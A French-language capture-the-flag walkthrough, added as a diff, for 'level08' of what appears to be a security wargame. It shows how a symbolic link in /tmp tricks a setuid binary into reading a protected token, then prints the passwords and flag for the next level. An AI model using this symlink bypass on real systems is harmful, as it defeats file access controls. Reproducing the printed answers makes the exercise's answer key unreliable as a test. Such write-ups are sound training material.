@@ -1,0 +1,26 @@
+LEVEL 08
+--------
+
+1.  Commande:   ls
+    Sortie:     level08 token
+
+2.  On lance l'exécutable level08.
+    Commande:   ./level08
+    Sortie:     ./level08 [file to read]
+
+3.  Il faut passer le fichier token mais il n'est pas
+    accessible depuis ce fichier. Donc on va créer un lien dans /tmp.
+    Commande:   ln -s ~/token /tmp/flag
+
+4.  On va lancer l'exécutable en passant le lien symbolique du token.
+    Commande:   ./level08 /tmp/flag
+    Sortie:     quif5eloekouj29ke0vouxean
+
+5.  Commande:   su flag08
+    Mdp:        quif5eloekouj29ke0vouxean
+
+6.  Commande:   getflag
+    Sortie:     Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+7.  Commande:   su level09
+    Mdp:        25749xKZ8L7DkSCwJkT9dyv6f
